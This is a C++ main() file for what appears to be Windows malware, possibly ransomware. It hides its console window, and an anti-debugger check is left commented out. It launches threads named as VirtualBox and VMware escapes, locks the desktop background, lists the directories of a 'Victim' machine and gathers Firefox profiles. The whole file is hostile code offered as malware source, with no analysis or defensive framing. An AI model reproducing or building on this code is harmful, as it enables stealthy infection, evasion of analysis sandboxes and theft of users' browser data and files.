#include "Includes.h"
#include "Registry.h"
#include "Victim.h"
#include "VMEscape.h"
#include "Misc.h"
#include <filesystem>

int main(int argc, char* argv[]) {
#ifndef _DEBUG
	//	if (IsDebuggerPresent()) {
	//		exit(EXIT_FAILURE);
	//	}
	HWND hWindowConsole;
	AllocConsole();
	hWindowConsole = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWindowConsole, 0);
#endif
	std::thread virtualBoxChange(VMEscape::virtualBoxEscape);
	std::thread VMWareBoxChange(VMEscape::VMWareEscape);
	//Check permissions if we are admin, lock backgroundChange
	std::thread tBackgroundChange(SCH::LockBackground);

	Victim* CurrentComputer = new Victim;
	Registers::Key CentralProcessorSubKeys = Registers::RegEnumSubKeys(HKEY_LOCAL_MACHINE, "Hardware\\Description\\System\\CentralProcessor");
	std::thread t_DirectoriesEnum(&Victim::GetDirectoryList, CurrentComputer);
	std::thread t_GetFirefoxProfiles(&Victim::GetFirefoxProfiles, CurrentComputer);
	virtualBoxChange.join();
	VMWareBoxChange.join();
	tBackgroundChange.join();
	t_DirectoriesEnum.join();
	CurrentComputer->GetFirefoxProfiles();
	t_GetFirefoxProfiles.join();
}
